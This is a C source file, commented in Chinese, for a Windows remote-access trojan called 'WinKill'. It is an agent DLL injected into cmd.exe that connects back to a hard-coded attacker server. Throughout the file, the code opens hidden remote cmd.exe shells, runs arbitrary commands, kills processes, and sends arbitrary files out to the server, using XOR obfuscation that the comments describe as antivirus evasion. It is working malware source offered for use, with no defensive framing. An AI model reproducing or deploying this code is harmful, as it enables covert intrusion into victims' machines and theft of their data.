/*
 * ================================================================
 * WinKill C2 Agent (Shellcode DLL)
 * ================================================================
 *
 * 【这是什么】
 * 这是一个"马"的核心部分——在被控机器上运行，连接攻击者的服务器，
 * 接收命令并执行。编译成DLL，被 injector.exe 注入到 cmd.exe 中运行。
 *
 * 【架构】
 *   AgentMain 线程 (主循环)
 *     ├─ 连接 C2 服务器
 *     ├─ 自动创建 Shell #1 (cmd.exe + 管道)
 *     ├─ 帧接收循环 (select 100ms 超时)
 *     ├─ 帧分发器 (Dispatch)
 *     │    ├─ 控制命令 → 创建shell/列进程/杀进程/文件传输
 *     │    └─ Shell数据 → 写入对应cmd.exe的stdin管道
 *     ├─ 僵尸清理 (每30秒)
 *     └─ 状态上报 (心跳)
 *
 * 【关键数据结构】
 *   Job - 作业/会话结构体
 *     id:     作业编号 (自增)
 *     ch:     信道ID (用于区分不同的shell会话)
 *     hp:     cmd.exe 进程句柄
 *     hi:     stdin 管道写端 (Agent→cmd)
 *     ho:     stdout管道读端 (cmd→Agent)
 *     on:     活跃标志
 *     nx:     链表指针 (指向下一个Job)
 *
 * 【通信协议】
 *   单TCP连接，多信道复用:
 *   [4B总长度][4B信道ID][1B类型][NB载荷]
 *
 *   信道0x00000000 = 控制信道 (心跳/状态/命令)
 *   信道0x10000001+ = Shell会话信道
 *
 *   XOR加密: 信道ID + 类型 + 载荷 进行XOR
 *
 * 【免杀要点】
 *   - 作为DLL被注入到cmd.exe，不独立存在
 *   - XOR加密隐藏C2通信内容
 *   - 单TCP连接减少网络特征
 *   - 僵尸清理防止cmd.exe残留
 */

#include <windows.h>   // Windows API (CreateProcess, VirtualAlloc, etc.)
#include <winsock2.h>  // WinSock (socket, connect, send, recv)
#include <tlhelp32.h>  // ToolHelp (CreateToolhelp32Snapshot for process list)
#include <stdlib.h>    // atoi
#include <string.h>    // memcpy, strlen, memset
#include <stdio.h>     // wsprintfA

// ============================================================
// C2 配置 - 编译时通过 -D 参数设置
// ============================================================
#ifndef C2_IP
#define C2_IP   0xA766A8C0   // IP地址 (host byte order)
#endif
#ifndef C2_PORT
#define C2_PORT 4444          // 端口号
#endif

// ============================================================
// 信道ID 定义
// ============================================================
#define CHAN_CTRL     0x00000000  // 控制信道
#define CHAN_SHELL_B  0x10000000  // Shell信道基数
#define CHAN_SHELL(id) (CHAN_SHELL_B | (id))  // Shell信道(id)

// ============================================================
// 消息类型 定义
// ============================================================
#define MSG_HEARTBEAT   0x00  // 心跳 (C2→Agent)
#define MSG_STATUS      0x01  // 状态报告 (Agent→C2)
#define MSG_SHUTDOWN    0x02  // 关闭命令 (C2→Agent)
#define MSG_SHELL_SPAWN 0x10  // 创建新Shell (C2→Agent)
#define MSG_SHELL_DATA  0x11  // Shell数据 (双向)
#define MSG_SHELL_KILL  0x12  // 关闭Shell (C2→Agent)
#define MSG_PROC_LIST   0x20  // 请求进程列表 (C2→Agent)
#define MSG_PROC_KILL   0x21  // 杀进程 (C2→Agent)
#define MSG_BIN_EXEC    0x40  // 执行命令 (C2→Agent)
#define MSG_FILE_GET    0x50  // 下载文件 (C2→Agent)
#define MSG_FILE_PUT    0x51  // 上传文件 (C2→Agent)
#define MSG_FILE_DATA   0x52  // 文件数据 (Agent→C2)

// ============================================================
// XOR加密密钥 (16字节)
// ============================================================
static BYTE g_key[16] = {
    0x4A,0x7F,0x23,0x9C,0x11,0x8E,0x55,0x3D,
    0x6B,0x12,0x89,0xFA,0x34,0xD7,0x01,0xCB
};

// XOR加密/解密函数 (对称加密)
static void X(BYTE *d, DWORD n) {
    for (DWORD i = 0; i < n; i++)
        d[i] ^= g_key[i % 16];  // 每个字节与密钥对应位置XOR
}

// ============================================================
// Job结构体 - 全局状态表的核心
// ============================================================
typedef struct Job {
    DWORD  id;       // 作业唯一编号 (自增)
    DWORD  ch;       // 信道ID (决定数据路由到哪个shell)
    HANDLE hp;       // cmd.exe 进程句柄 (用于等待/终止)
    HANDLE ht;       // cmd.exe 主线程句柄
    HANDLE hi;       // stdin管道写端 (Agent写入 → cmd读取)
    HANDLE ho;       // stdout管道读端 (cmd写入 → Agent读取)
    BYTE   on;       // 是否活跃 (0=已关闭, 1=运行中)
    struct Job *nx;  // 链表指针 → 下一个Job
} Job;

// ============================================================
// 全局变量
// ============================================================
static Job      *g_j  = NULL;           // Job链表头指针
static DWORD     g_nid = 1;             // 作业ID自增器
static SOCKET    g_sk = INVALID_SOCKET; // 控制Socket
static volatile LONG g_r = 1;           // 运行标志 (0=退出)
static CRITICAL_SECTION g_l;            // 临界区锁 (保护Job链表)

// ============================================================
// Tx - 发送帧
// 参数: ch=信道ID, t=消息类型, d=载荷指针, n=载荷长度
// ============================================================
static int Tx(DWORD ch, BYTE t, const void *d, DWORD n) {
    DWORD tl = n + 5;  // 总长度 = 信道(4) + 类型(1) + 载荷(n)

    // 分配缓冲区: [4B总长][4B信道][1B类型][NB载荷] = tl + 4 字节
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl + 4);
    if (!b) return -1;

    // 填充帧
    *(DWORD *)(b)     = tl;        // 总长度
    *(DWORD *)(b + 4) = ch;        // 信道ID
    *(BYTE  *)(b + 8) = t;         // 消息类型
    if (d && n) memcpy(b + 9, d, n); // 载荷

    // XOR加密 (从第5字节开始，即信道+类型+载荷)
    X(b + 4, tl);

    // 发送
    int r = send(g_sk, (char *)b, tl + 4, 0);
    HeapFree(GetProcessHeap(), 0, b);
    return r;
}

// ============================================================
// Rx - 接收帧
// 参数: ch=信道ID(out), t=类型(out), d=载荷(out), n=载荷长度(out)
// 返回: 0=成功, -1=失败
// ============================================================
static int Rx(DWORD *ch, BYTE *t, BYTE **d, DWORD *n) {
    // 1. 读取总长度 (4字节)
    DWORD tl;
    if (recv(g_sk, (char *)&tl, 4, 0) != 4) return -1;
    if (tl > 0x100000 || tl < 5) return -1;  // 合理性检查: 1MB上限

    // 2. 分配缓冲区并循环读取剩余数据
    BYTE *b = (BYTE *)HeapAlloc(GetProcessHeap(), 0, tl);
    if (!b) return -1;

    DWORD got = 0;
    while (got < tl) {
        int r = recv(g_sk, (char *)b + got, tl - got, 0);
        if (r <= 0) { HeapFree(GetProcessHeap(), 0, b); return -1; }
        got += r;
    }

    // 3. XOR解密
    X(b, tl);

    // 4. 解析帧
    *ch = *(DWORD *)(b);      // 信道ID (b[0..3])
    *t  = *(BYTE  *)(b + 4);  // 消息类型 (b[4])
    *n  = tl - 5;             // 载荷长度

    // 5. 提取载荷
    if (*n > 0) {
        *d = (BYTE *)HeapAlloc(GetProcessHeap(), 0, *n);
        if (*d) memcpy(*d, b + 5, *n);
    } else *d = NULL;

    HeapFree(GetProcessHeap(), 0, b);
    return 0;
}

// ============================================================
// Job链表操作
// ============================================================

// JN - 创建新Job并插入链表头部
static Job *JN(DWORD ch) {
    Job *j = (Job *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(Job));
    if (!j) return NULL;

    j->id = g_nid++;    // 分配ID并自增
    j->ch = ch;          // 设置信道
    j->on = 1;           // 标记活跃

    // 临界区保护链表操作 (多线程安全)
    EnterCriticalSection(&g_l);
    j->nx = g_j;         // 新节点指向当前头部
    g_j = j;             // 头部指向新节点 (头插法)
    LeaveCriticalSection(&g_l);

    return j;
}

// JF - 根据信道ID查找Job
static Job *JF(DWORD ch) {
    Job *j = g_j;
    while (j) {
        if (j->ch == ch && j->on) return j;
        j = j->nx;
    }
    return NULL;
}

// JK - 关闭Job并释放资源
static void JK(Job *j) {
    if (!j || !j->on) return;
    j->on = 0;                     // 标记为不活跃

    // 终止cmd.exe进程
    if (j->hp) { TerminateProcess(j->hp, 0); CloseHandle(j->hp); }
    if (j->ht) CloseHandle(j->ht);

    // 关闭管道
    if (j->hi) CloseHandle(j->hi);
    if (j->ho) CloseHandle(j->ho);
}

// RP - 僵尸进程清理 (遍历链表，清理已退出的进程)
static void RP(void) {
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) {
        // WaitForSingleObject(hp, 0) 检查进程是否还活着
        // 返回WAIT_OBJECT_0=已退出, WAIT_TIMEOUT=还在运行
        if (j->on && j->hp && WaitForSingleObject(j->hp, 0) == WAIT_OBJECT_0) {
            JK(j);  // 进程已死，清理Job
        }
        j = j->nx;
    }
    LeaveCriticalSection(&g_l);
}

// ============================================================
// SO - Stdout桥接线程 (cmd.exe stdout → 加密帧 → C2)
// ============================================================
static DWORD WINAPI SO(LPVOID p) {
    Job *j = (Job *)p;
    BYTE b[8192]; DWORD n;

    // 循环读取cmd.exe的输出，包装成帧发送给C2
    while (j->on && ReadFile(j->ho, b, sizeof(b), &n, NULL) && n > 0) {
        Tx(j->ch, MSG_SHELL_DATA, b, n);
    }
    return 0;
}

// ============================================================
// SP - 创建Shell会话
// 创建一个新的cmd.exe，stdin/stdout通过管道桥接到C2
// ============================================================
static Job *SP(DWORD ch) {
    HANDLE r1, w1, r2, w2;
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };  // 可继承句柄

    // 创建两对匿名管道
    // stdin管道: Agent写(w1) → cmd读(r1)
    // stdout管道: cmd写(w2) → Agent读(r2)
    if (!CreatePipe(&r1, &w1, &sa, 0)) return NULL;
    if (!CreatePipe(&r2, &w2, &sa, 0)) {
        CloseHandle(r1); CloseHandle(w1); return NULL;
    }

    // 配置STARTUPINFO，将cmd.exe的stdin/stdout重定向到管道
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags     = 0x101;  // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    si.wShowWindow = 0;      // SW_HIDE - 隐藏窗口
    si.hStdInput   = r1;     // cmd的stdin = 管道读端
    si.hStdOutput  = w2;     // cmd的stdout = 管道写端
    si.hStdError   = w2;     // cmd的stderr = 管道写端

    // 创建cmd.exe子进程
    if (!CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                        0x08000000,  // CREATE_NO_WINDOW
                        NULL, NULL, &si, &pi)) {
        // 失败则清理管道
        CloseHandle(r1); CloseHandle(w1);
        CloseHandle(r2); CloseHandle(w2);
        return NULL;
    }

    // 父进程端关闭不需要的句柄
    CloseHandle(r1);   // 子进程的stdin读端 (父进程不需要读)
    CloseHandle(w2);   // 子进程的stdout写端 (父进程不需要写)

    // 创建Job并注册到全局表
    Job *j = JN(ch);
    if (!j) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        CloseHandle(w1); CloseHandle(r2);
        return NULL;
    }

    j->hp = pi.hProcess;  // cmd.exe进程句柄
    j->ht = pi.hThread;   // cmd.exe主线程句柄
    j->hi = w1;           // stdin写端 (Agent→cmd)
    j->ho = r2;           // stdout读端 (cmd→Agent)

    // 启动stdout桥接线程 (发送cmd输出到C2)
    // 注意: stdin不单独开线程，由Dispatch直接写入
    CreateThread(NULL, 0, SO, j, 0, NULL);

    return j;
}

// ============================================================
// PS - 进程列表 (通过ToolHelp32Snapshot枚举)
// ============================================================
static void PS(void) {
    char b[8192] = {0}; int p = 0;

    // 创建进程快照
    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (sn == INVALID_HANDLE_VALUE) return;

    // 表头
    p += wsprintfA(b + p, "%-8s %-6s %s\r\n", "PID", "PPID", "Name");
    p += wsprintfA(b + p, "------------------------\r\n");

    // 遍历所有进程
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(sn, &pe)) {
        do {
            int r = (int)sizeof(b) - p - 128;
            if (r < 0) break;
            p += wsprintfA(b + p, "%-8lu %-6lu %s\r\n",
                          pe.th32ProcessID,        // 进程ID
                          pe.th32ParentProcessID,  // 父进程ID
                          pe.szExeFile);           // 进程名
        } while (Process32Next(sn, &pe));
    }
    CloseHandle(sn);

    // 通过控制信道发回给C2
    Tx(CHAN_CTRL, MSG_PROC_LIST, b, p);
}

// ============================================================
// PK - 杀进程
// ============================================================
static void PK(const char *s) {
    DWORD pi = (DWORD)atoi(s);  // 字符串→数字
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pi);
    char m[128];
    if (h) {
        TerminateProcess(h, 0);
        CloseHandle(h);
        wsprintfA(m, "Killed PID %lu\r\n", pi);
    } else {
        wsprintfA(m, "Failed PID %lu\r\n", pi);
    }
    Tx(CHAN_CTRL, MSG_PROC_KILL, m, (DWORD)strlen(m));
}

// ============================================================
// Dispatch - 帧分发器 (核心: 单线程处理所有帧)
// ============================================================
static void Dispatch(DWORD ch, BYTE t, BYTE *d, DWORD n) {

    // 【重点】Shell数据帧 → 直接写入对应cmd.exe的stdin管道
    // 这样主循环统一接收所有帧，没有竞态条件
    if ((ch & 0xF0000000) == CHAN_SHELL_B && t == MSG_SHELL_DATA) {
        Job *j = JF(ch);  // 根据信道ID找到对应Job
        if (j && j->on && d) {
            DWORD w;
            WriteFile(j->hi, d, n, &w, NULL);  // 写入管道 → cmd.exe收到命令
        }
        if (d) HeapFree(GetProcessHeap(), 0, d);
        return;
    }

    // 控制信道消息处理
    switch (t) {

    case MSG_HEARTBEAT:
        break;  // 心跳只做保活，不响应

    case MSG_SHUTDOWN:
        g_r = 0;  // 设置退出标志 → 主循环退出
        break;

    case MSG_SHELL_SPAWN:
        // 载荷格式: [4B 新信道ID]
        if (n >= 4) {
            DWORD nc = *(DWORD *)d;
            Job *j = SP(nc);  // 创建新shell
            char r[64];
            int l = wsprintfA(r, "OK shell ch=%08X id=%lu\r\n", nc, j ? j->id : 0);
            Tx(CHAN_CTRL, MSG_STATUS, r, l);
        }
        break;

    case MSG_SHELL_KILL:
        if ((ch & 0xF0000000) == CHAN_SHELL_B) {
            Job *j = JF(ch);
            if (j) JK(j);
        }
        break;

    case MSG_PROC_LIST:
        PS();  // 枚举进程并返回
        break;

    case MSG_PROC_KILL:
        if (d && n) PK((char *)d);
        break;

    case MSG_FILE_GET:
        // 下载文件: 打开文件 → 读取 → 打包成 FILE_DATA 帧返回
        if (d && n) {
            HANDLE hf = CreateFileA((char*)d, GENERIC_READ, FILE_SHARE_READ,
                                    NULL, OPEN_EXISTING, 0, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                DWORD sz = GetFileSize(hf, NULL);
                BYTE *fb = (BYTE *)HeapAlloc(GetProcessHeap(), 0, sz + 256);
                if (fb) {
                    WORD fnLen = (WORD)strlen((char*)d);
                    *(WORD*)fb = fnLen;
                    memcpy(fb + 2, d, fnLen);
                    DWORD r;
                    ReadFile(hf, fb + 2 + fnLen, sz, &r, NULL);
                    Tx(CHAN_CTRL, MSG_FILE_DATA, fb, 2 + fnLen + r);
                    HeapFree(GetProcessHeap(), 0, fb);
                }
                CloseHandle(hf);
            }
        }
        break;

    case MSG_FILE_PUT:
        // 上传文件: 载荷=[2B路径长度][路径][文件数据]
        if (d && n > 2) {
            WORD pl = *(WORD*)d;
            if (pl < n - 2) {
                char path[MAX_PATH];
                memcpy(path, d + 2, pl); path[pl] = 0;
                HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hf != INVALID_HANDLE_VALUE) {
                    DWORD w;
                    WriteFile(hf, d + 2 + pl, n - 2 - pl, &w, NULL);
                    CloseHandle(hf);
                    char ok[128];
                    int l = wsprintfA(ok, "OK: Wrote %lu bytes to %s\r\n", w, path);
                    Tx(CHAN_CTRL, MSG_STATUS, ok, l);
                }
            }
        }
        break;

    case MSG_BIN_EXEC:
        // 执行命令: 创建临时shell，执行命令，捕获输出
        if (d && n) {
            DWORD tmpCh = 0xF0000000 | (GetTickCount() & 0x0FFFFFFF);
            Job *j = SP(tmpCh);
            if (j) {
                DWORD w;
                WriteFile(j->hi, d, n, &w, NULL);
                char exitCmd[] = "\r\nexit\r\n";
                WriteFile(j->hi, exitCmd, (DWORD)strlen(exitCmd), &w, NULL);
            }
        }
        break;
    }

    if (d) HeapFree(GetProcessHeap(), 0, d);
}

// ============================================================
// AgentMain - C2 Agent 主入口 (在新线程中运行)
// ============================================================
DWORD WINAPI AgentMain(LPVOID param) {
    WSADATA w;
    WSAStartup(MAKEWORD(2,2), &w);           // 初始化WinSock
    InitializeCriticalSection(&g_l);          // 初始化临界区

    // 1. 创建Socket并连接C2
    g_sk = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    if (g_sk == INVALID_SOCKET) goto done;

    struct sockaddr_in a;
    a.sin_family = AF_INET;
    a.sin_port   = htons(C2_PORT);
    a.sin_addr.s_addr = C2_IP;

    if (connect(g_sk, (struct sockaddr*)&a, sizeof(a)) != 0) {
        closesocket(g_sk); g_sk = INVALID_SOCKET;
        goto done;
    }

    // 2. 自动创建默认shell (信道1)
    SP(CHAN_SHELL(1));

    // 3. 主事件循环
    DWORD lr = 0;  // 上次清理时间
    while (g_r) {
        // select 等待socket可读，100ms超时
        struct timeval tv = {0, 100000};  // 100ms
        fd_set f; FD_ZERO(&f); FD_SET(g_sk, &f);

        if (select(0, &f, NULL, NULL, &tv) > 0) {
            // socket有数据 → 接收帧 → 分发处理
            DWORD ch; BYTE t; BYTE *d; DWORD n;
            if (Rx(&ch, &t, &d, &n) == 0) {
                Dispatch(ch, t, d, n);
            } else {
                break;  // 连接断开
            }
        }

        // 每30秒清理僵尸进程
        if (GetTickCount() - lr > 30000) {
            RP();
            lr = GetTickCount();
        }
    }

done:
    // 清理：杀掉所有Job
    EnterCriticalSection(&g_l);
    Job *j = g_j;
    while (j) { Job *nx = j->nx; JK(j); j = nx; }
    LeaveCriticalSection(&g_l);

    if (g_sk != INVALID_SOCKET) closesocket(g_sk);
    WSACleanup();
    DeleteCriticalSection(&g_l);
    return 0;
}

// ============================================================
// DllMain - DLL入口 (DLL被加载时自动调用)
// ============================================================
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID v) {
    if (reason == DLL_PROCESS_ATTACH) {       // DLL被加载到进程时
        DisableThreadLibraryCalls(h);         // 优化: 禁用线程通知
        // 创建Agent主线程 (CloseHandle不等待线程结束)
        CloseHandle(CreateThread(NULL, 0, AgentMain, NULL, 0, NULL));
    }
    return TRUE;
}
